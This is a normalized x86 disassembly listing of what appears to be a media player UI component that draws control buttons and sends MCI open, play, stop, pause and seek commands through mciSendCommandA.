mov eax [ ecx + eax * 4 + 0x214 ]
call sub_428f08
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ esi + 0x2c0 ]
jle r-xdata
inc [ esp ]
add ebp 0x4
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
mov edi rw-data
add [ esi + 0x2c0 ] 0x8
add [ esi + 0x2c4 ] 0x4
add esp 0x44
pop ebp
pop edi
pop esi
pop ebx
retn
sub_48148c
push ebx
push esi
push ecx
mov esi eax
mov [ esp ] 0x0
xor eax eax
mov al [ esp ]
add eax eax
lea eax [ esi + eax * 8 ]
xor edx edx
mov dl bl
mov eax [ eax + edx * 4 + 0x214 ]
call sub_4032b0
inc ebx
cmp bl 0x3
jne r-xdata
inc [ esp ]
cmp [ esp ] 0x9
jne r-xdata
xor ebx ebx
pop edx
pop esi
pop ebx
retn
sub_4814ec
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a2 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x211 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a2 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_481530
push ebx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x213 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a6 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_481564
push ebx
push ecx
mov [ esp ] dx
mov dx [ esp ]
mov [ eax + 0x2a4 ] dx
xor edx edx
setb cl
xor ebx ebx
mov bl dl
add ebx ebx
mov [ eax + ebx * 8 + 0x212 ] cl
inc edx
cmp dl 0x9
jne r-xdata
and ecx 0x7f
bt [ eax + 0x2a4 ] ecx
mov ecx edx
cmp cl 0xf
ja r-xdata
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_4815a8
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
mov [ ebx + 0x2a0 ] ax
xor eax eax
setb dl
xor ecx ecx
mov cl al
add ecx ecx
mov [ ebx + ecx * 8 + 0x210 ] dl
inc eax
cmp al 0x9
jne r-xdata
and edx 0x7f
bt [ ebx + 0x2a0 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
test [ ebx + 0x1c ] 0x40
je r-xdata
mov eax ebx
call sub_481640
pop edx
pop ebx
retn
mov eax ebx
call sub_481618
push eax
mov eax [ ebx + 0x48 ]
dec eax
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebx + 0x2bc ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop edx
pop ebx
retn
sub_481618
push esi
xor esi esi
xor edx edx
inc edx
cmp dl 0x9
jne r-xdata
inc esi
xor ecx ecx
mov cl dl
add ecx ecx
cmp [ eax + ecx * 8 + 0x210 ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
inc esi
sub_481640
push ebx
mov ebx eax
mov eax ebx
call sub_481618
mov edx [ ebx + 0x2bc ]
dec edx
imul edx eax
inc edx
mov eax ebx
call sub_44f010
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_481668
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] edx
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_454640
test [ ebx + 0x1c ] 0x40
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_481618
mov ecx eax
mov eax [ ebx + 0x2c0 ]
dec eax
imul ecx
inc eax
mov [ esp + 0x4 ] eax
mov esi [ ebx + 0x2c4 ]
mov [ esp + 0x8 ] esi
mov eax [ ebx + 0x48 ]
dec eax
cdq
idiv ecx
mov edi eax
inc edi
mov [ ebx + 0x2bc ] edi
mov eax edi
dec eax
imul ecx
inc eax
mov edx [ esp + 0x4 ]
cmp eax edx
jge r-xdata
mov edx [ ebx + 0x4c ]
cmp esi edx
jg r-xdata
mov eax edx
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov esi edx
push eax
push esi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp esi [ ebx + 0x4c ]
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax + 0xc ] edx
sub_4816f8
push ebx
push esi
push edi
push ebp
add esp 0xffffffc4
mov edi ecx
mov [ esp ] dl
mov ebx eax
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esp ]
cmp al [ ebx + 0x2aa ]
je r-xdata
mov [ esp + 0x1 ] al
mov esi [ ebx + 0x208 ]
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424cdc
mov edx 0xff00000f
mov eax [ esi + 0x14 ]
call sub_424bc0
mov edx 0xff000006
mov eax [ esi + 0x10 ]
call sub_4248e0
mov edx 0x1
mov eax [ esi + 0x10 ]
call sub_4249ec
mov eax [ ebx + 0x2bc ]
add eax edi
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
mov edx edi
mov eax esi
call sub_425328
cmp [ esp + 0x1 ] 0x0
je r-xdata
mov al 0x1
mov edx 0xff000014
mov eax [ esi + 0x10 ]
call sub_4248e0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_4252fc
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_42529c
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_42529c
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_4248e0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea edx [ edi + 0x2 ]
mov eax esi
call sub_4252fc
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov eax esi
call sub_42529c
mov edx [ ebx + 0x2bc ]
add edx edi
sub edx 0x2
mov ecx 0x1
mov eax esi
call sub_42529c
mov edx 0xff000010
mov eax [ esi + 0x10 ]
call sub_4248e0
mov ecx [ ebx + 0x4c ]
sub ecx 0x2
lea ebp [ edi + 0x1 ]
mov edx ebp
mov eax esi
call sub_4252fc
mov edx ebp
mov ecx 0x1
mov eax esi
call sub_42529c
mov edx [ ebx + 0x2bc ]
add edx edi
dec edx
mov ecx 0x1
mov eax esi
call sub_42529c
jmp r-xdata
cmp [ ebx + 0x31c ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x211 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov al 0x1
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
xor eax eax
mov al [ esp ]
mov edx eax
add edx edx
cmp [ ebx + edx * 8 + 0x213 ] 0x0
je r-xdata
mov edx [ ebx + 0x2bc ]
sar edx 0x1
jns r-xdata
adc eax 0x0
and eax 0x7f
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ ebx + edx * 8 ]
mov ebp [ edx + eax * 4 + 0x214 ]
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
sar eax 0x1
jns r-xdata
mov al 0x2
jmp r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
cmp [ ebx + edx * 8 + 0x212 ] 0x0
je r-xdata
sub edx eax
mov [ esp + 0x4 ] edx
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
sar eax 0x1
jns r-xdata
adc edx 0x0
mov al 0x2
jmp r-xdata
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
sub edx eax
mov [ esp + 0x8 ] edx
cmp [ esp + 0x1 ] 0x0
je r-xdata
adc edx 0x0
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417358
lea eax [ esp + 0x1c ]
push eax
push 0x8080
mov eax ebp
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ esp + 0x38 ]
push eax
mov eax ebp
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
mov eax [ esp + 0x14 ]
add eax edi
mov edx [ esp + 0x18 ]
call sub_417380
lea edx [ esp + 0x34 ]
mov ecx ebp
mov eax esi
call sub_424e30
mov eax ebx
call sub_456054
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
inc [ esp + 0x4 ]
inc [ esp + 0x8 ]
add esp 0x3c
pop ebp
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ ebx + 0x2e0 ]
jne r-xdata
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x10 ]
push eax
mov ecx [ ebx + 0x2bc ]
xor edx edx
mov eax edi
call sub_417380
push 0xfffffffd
push 0xfffffffd
lea eax [ esp + 0x14 ]
push eax
call InflateRect
cmp [ esp + 0x1 ] 0x0
je r-xdata
lea eax [ esp + 0xc ]
push eax
mov eax [ ebx + 0x208 ]
call sub_425648
push eax
call DrawFocusRect
push 0x1
push 0x1
lea eax [ esp + 0x14 ]
push eax
call OffsetRect
sub_4819f4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x208 ]
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_424cdc
mov eax [ ebx + 0x10 ]
mov edx 0xff000006
call sub_4248e0
mov eax [ ebx + 0x10 ]
mov edx 0x1
call sub_4249ec
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_425328
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
mov ecx edi
mov edx ebx
mov eax esi
call sub_4816f8
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_481a68
push ebx
mov ebx eax
xor eax eax
mov al dl
cmp eax 0x8
ja r-xdata
pop ebx
retn
jmp [ eax * 4 + jump_table_481a7f ]
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
or [ ebx + 0x2a6 ] 0x80
pop ebx
retn
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
pop ebx
retn
or [ ebx + 0x2a6 ] 0x80
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
or [ ebx + 0x2a6 ] 0x80
sub_481c90
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
xor edi edi
xor ebx ebx
inc ebx
cmp bl 0x9
jne r-xdata
cmp edi edx
jg r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x210 ] 0x0
je r-xdata
mov eax ebx
mov [ esi + 0x2aa ] al
cmp al [ esi + 0x2e0 ]
je r-xdata
mov eax [ esi + 0x2bc ]
dec eax
add edi eax
mov eax [ esi + 0x2bc ]
add eax edi
cmp edx eax
jg r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ esi + 0x2bc ]
add ecx edi
xor edx edx
mov eax edi
call sub_417358
push esi
push edi
lea edi [ esi + 0x2ab ]
lea esi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov [ esi + 0x2a8 ] 0x1
mov [ esi + 0x2a9 ] 0x1
mov ecx edi
mov edx ebx
mov eax esi
call sub_4816f8
mov dl 0x1
mov eax esi
call sub_44fa8c
mov [ esi + 0x2e0 ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp [ esi + 0x31c ] 0x0
je r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x211 ] 0x0
jne r-xdata
xor eax eax
mov al bl
add eax eax
cmp [ esi + eax * 8 + 0x213 ] 0x0
jne r-xdata
jmp r-xdata
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_481d90
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov edi eax
cmp [ edi + 0x2a8 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
movsx edx [ esi + 0xa ]
movsx eax [ esi + 0x8 ]
call sub_417330
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ edi + 0x2ab ]
push eax
call PtInRect
cmp eax 0x1
sbb eax eax
inc eax
mov bl [ edi + 0x2a9 ]
cmp al bl
je r-xdata
xor bl 0x1
mov [ edi + 0x2a9 ] bl
mov ecx [ edi + 0x2ab ]
mov dl [ edi + 0x2aa ]
mov eax edi
call sub_4816f8
sub_481df8
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x1
mov ecx esp
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb2
call sub_4034ac
cmp [ esp ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x2aa ]
cmp eax 0x8
ja r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_481eb8
jmp [ eax * 4 + jump_table_481e32 ]
mov eax ebx
call sub_482538
jmp r-xdata
mov eax ebx
call sub_4827b4
jmp r-xdata
mov eax ebx
call sub_482720
jmp r-xdata
mov eax ebx
call sub_482948
jmp r-xdata
mov eax ebx
call sub_482ad8
jmp r-xdata
mov eax ebx
call sub_482c94
jmp r-xdata
mov eax ebx
call sub_482d70
jmp r-xdata
mov eax ebx
call sub_482648
jmp r-xdata
mov eax ebx
call sub_482e34
sub_481ecc
push ebx
push esi
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fa8c
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
mov [ ebx + 0x2a8 ] 0x0
pop esi
pop ebx
retn
cmp [ ebx + 0x2a9 ] 0x0
je r-xdata
mov [ ebx + 0x2a9 ] 0x0
mov ecx [ ebx + 0x2ab ]
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_4816f8
mov dl [ ebx + 0x2aa ]
mov eax ebx
call sub_481df8
cmp [ ebx + 0x31c ] 0x0
je r-xdata
cmp [ ebx + 0x304 ] 0x0
jne r-xdata
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
mov dl [ ebx + 0x2aa ]
mov eax ebx
mov si 0xffb3
call sub_4034ac
mov eax ebx
call sub_481530
sub_481f70
push esi
push edi
mov edi eax
mov ax [ edx ]
sub ax 0x20
je r-xdata
mov al [ edi + 0x2e0 ]
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x211 ] 0x0
je r-xdata
sub ax 0x5
je r-xdata
pop edi
pop esi
retn
mov edx eax
mov [ edi + 0x2aa ] dl
mov eax edi
call sub_481df8
cmp [ edi + 0x31c ] 0x0
je r-xdata
mov al [ edi + 0x2e0 ]
sub ax 0x2
jne r-xdata
mov dl [ edi + 0x2aa ]
mov eax edi
mov si 0xffb3
call sub_4034ac
mov eax edi
call sub_481530
test al al
je r-xdata
dec eax
mov al [ edi + 0x2e0 ]
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
cmp al 0x8
je r-xdata
inc eax
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
test al al
jbe r-xdata
cmp al [ edi + 0x2e0 ]
je r-xdata
xor edx edx
mov dl al
add edx edx
cmp [ edi + edx * 8 + 0x210 ] 0x0
je r-xdata
mov [ edi + 0x2e0 ] al
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
pop edi
pop esi
retn
cmp al 0x8
jae r-xdata
sub_48204c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x31c ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
dec eax
je r-xdata
mov eax ebx
call sub_483334
cmp al 0x1
jne r-xdata
mov [ ebx + 0x308 ] 0x0
jmp r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffb0
call sub_4034ac
pop esi
pop ebx
retn
mov [ ebx + 0x308 ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
mov [ ebx + 0x308 ] 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_481530
or [ ebx + 0x2a6 ] 0x80
mov [ ebx + 0x308 ] 0x3
jmp r-xdata
sub_4821fc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48245a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx 0x14
call sub_402cc4
cmp [ ebx + 0x2e1 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov al [ ebx + 0x2f4 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x318 ]
call sub_40456c
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_482470
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2f4 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x2000
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x200
or [ ebx + 0x2e8 ] 0x2000
jmp r-xdata
mov eax ebx
call sub_456054
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x803
push 0x0
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
je r-xdata
or [ ebx + 0x2e8 ] 0x100
cmp [ ebx + 0x31f ] 0x0
je r-xdata
mov [ ebx + 0x2e1 ] 0x1
mov ax [ ebp - 0x10 ]
mov [ ebx + 0x2f2 ] ax
mov eax ebx
call sub_4832a4
mov ecx 0xa
cdq
idiv ecx
mov [ ebx + 0x300 ] eax
mov eax ebx
call sub_483110
cmp [ ebx + 0x2e7 ] 0x0
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_483400
mov ecx [ ebp - 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
mov al [ ebx + 0x2f4 ]
cmp al 0x2
je r-xdata
mov edx [ ebx + 0x30c ]
mov eax ebx
call sub_482fa8
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4830bc
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
mov [ ebx + 0x310 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ ebx + 0x314 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482461
lea eax [ ebp - 0x28 ]
call sub_4040ac
retn
mov dl 0xa
mov eax ebx
call sub_482f6c
cmp al 0xb
jne r-xdata
cmp [ ebx + 0x2e3 ] 0x0
je r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x2a6 ]
mov [ ebx + 0x2a6 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
cmp [ ebx + 0x2e4 ] 0x0
je r-xdata
cmp [ ebx + 0x2e6 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x1
cmp [ ebx + 0x2e5 ] 0x0
je r-xdata
or [ ebx + 0x2a6 ] 0x80
mov eax ebx
call sub_483334
cmp al 0x2
jne r-xdata
or [ ebx + 0x2a6 ] 0x100
mov eax ebx
call sub_481530
xor edx edx
mov eax ebx
mov si 0xffb3
call sub_4034ac
sub_482470
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x2f2 ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x804
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov esi eax
mov [ ebx + 0x304 ] esi
test esi esi
jne r-xdata
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2e1 ] 0x0
mov [ ebx + 0x2f2 ] 0x0
mov ax [ r-xdata ]
mov [ ebx + 0x2a6 ] ax
mov eax ebx
call sub_481530
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_482538
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4820f0
cmp [ ebx + 0x31e ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov eax ebx
call sub_483378
mov esi eax
mov eax ebx
call sub_4832a4
cmp esi eax
jne r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
jne r-xdata
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_482ee0
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x806
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop esi
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_482648
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
cmp [ ebx + 0x2f0 ] 0x0
je r-xdata
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov [ ebx + 0x2ef ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2f1 ] 0x0
je r-xdata
or [ ebx + 0x2e8 ] 0x4
mov eax [ ebx + 0x2fc ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x2f0 ] 0x0
mov [ ebx + 0x2ee ] 0x0
or [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x80f
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
add esp 0xc
pop ebx
retn
or [ ebx + 0x2e8 ] 0x8
mov eax [ ebx + 0x2f8 ]
mov [ esp + 0x8 ] eax
mov [ ebx + 0x2f1 ] 0x0
sub_482720
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x808
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
or [ ebx + 0x2e8 ] 0x1
cmp [ ebx + 0x2ef ] 0x0
je r-xdata
sub_4827b4
push ebx
mov ebx eax
cmp [ ebx + 0x2e1 ] 0x0
jne r-xdata
mov eax ebx
call sub_483334
cmp al 0x2
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
mov eax ebx
call sub_483334
cmp al 0x5
jne r-xdata
mov eax ebx
call sub_482800
pop ebx
retn
pop ebx
retn
mov eax ebx
call sub_482894
sub_482800
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_4820f0
xor eax eax
mov [ ebx + 0x2e8 ] eax
cmp [ ebx + 0x2ee ] 0x0
je r-xdata
mov [ ebx + 0x2e8 ] 0x2
cmp [ ebx + 0x2ec ] 0x0
je r-xdata
mov eax ebx
call sub_456054
mov [ esp ] eax
mov eax esp
push eax
mov eax [ ebx + 0x2e8 ]
push eax
push 0x809
movzx eax [ ebx + 0x2f2 ]
push eax
call mciSendCommandA
mov [ ebx + 0x304 ] eax
pop edx
pop ebx
retn
cmp [ ebx + 0x2ed ] 0x0
je r-xdata
mov [ ebx + 0x2ee ] 0x0
jmp r-xdata
mov [ ebx + 0x2e8 ] 0x2
mov [ ebx + 0x2ef ] 0x0
